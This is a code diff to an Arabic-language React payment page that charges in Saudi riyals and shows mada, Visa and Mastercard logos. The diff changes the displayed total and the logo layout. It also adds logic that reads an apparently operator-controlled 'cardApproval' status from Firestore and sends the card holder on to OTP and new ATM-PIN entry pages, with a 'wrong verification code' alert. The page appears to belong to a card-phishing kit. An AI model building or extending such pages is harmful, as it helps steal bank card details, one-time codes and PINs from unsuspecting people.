@@ -79,10 +79,10 @@ export default function PaymentForm() {
       const userData = snap.data();
 
       if (userData.cardApproval === "pending") setIsLoading(true);
+      if (userData.cardApproval === "pin")
+        window.location.href = "/payment/atm-pin";
       if (userData.cardApproval === "otp")
         window.location.href = "/payment/otp";
-      if (userData.cardApproval === "approved")
-        window.location.href = "/payment/pin";
       if (userData.cardApproval === "rejected") alert("رمز التحقق غير صحيح");
       const redirectUrl = getRedirectUrl(userData.currentPage, "payment");
       if (redirectUrl) window.location.href = redirectUrl;
@@ -110,24 +110,24 @@ export default function PaymentForm() {
         </p>
 
         <div className="text-center mb-6">
-          <span className="text-5xl font-bold text-green-600">11.50</span>
+          <span className="text-5xl font-bold text-green-600">110.50</span>
           <span className="text-2xl font-bold text-green-600 mr-2">ر.س</span>
         </div>
 
         <div className="space-y-3 border-t border-stone-200 pt-4">
           <div className="flex justify-between items-center">
             <span className="text-stone-600">المجموع الفرعي</span>
-            <span className="font-semibold">10.00 ر.س</span>
+            <span className="font-semibold">100.00 ر.س</span>
           </div>
           <div className="flex justify-between items-center">
             <span className="text-stone-500 text-sm">
               ضريبة القيمة المضافة 15%
             </span>
-            <span className="text-stone-500">1.50 ر.س</span>
+            <span className="text-stone-500">10.50 ر.س</span>
           </div>
           <div className="flex justify-between items-center border-t border-stone-200 pt-3">
             <span className="font-bold text-stone-800">المبلغ المستحق</span>
-            <span className="font-bold text-stone-800">11.50 ر.س</span>
+            <span className="font-bold text-stone-800">110.50 ر.س</span>
           </div>
         </div>
       </div>
@@ -140,24 +140,6 @@ export default function PaymentForm() {
         <p className="text-stone-500 text-center text-sm mb-6">
           من فضلك أدخل معلومات الدفع الخاصة بك
         </p>
-
-        {/* Card Logos */}
-        <div className="flex items-center gap-3 mb-6 justify-center">
-          <div className="bg-blue-900 text-white text-xs font-bold px-2 py-1 rounded">
-            mada
-          </div>
-          <Image
-            src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
-            alt="Visa"
-            width={50}
-            height={20}
-            className="h-5 w-auto"
-          />
-          <div className="flex">
-            <div className="w-6 h-6 bg-red-500 rounded-full"></div>
-            <div className="w-6 h-6 bg-yellow-400 rounded-full -mr-3"></div>
-          </div>
-        </div>
 
         <div className="space-y-4">
           {/* Card Number */}
@@ -266,20 +248,24 @@ export default function PaymentForm() {
             <Image
               src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
               alt="Visa"
-              width={60}
+              width={40}
               height={24}
               className="h-6 w-auto"
             />
             <Image
               src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
               alt="Mastercard"
-              width={60}
+              width={40}
               height={32}
               className="h-8 w-auto"
             />
-            <div className="bg-blue-900 text-white text-xs font-bold px-3 py-1 rounded">
-              mada مدى
-            </div>
+            <Image
+              src="/mada.svg"
+              alt="Mastercard"
+              width={40}
+              height={32}
+              className="h-8 w-auto"
+            />
           </div>
         </div>
 
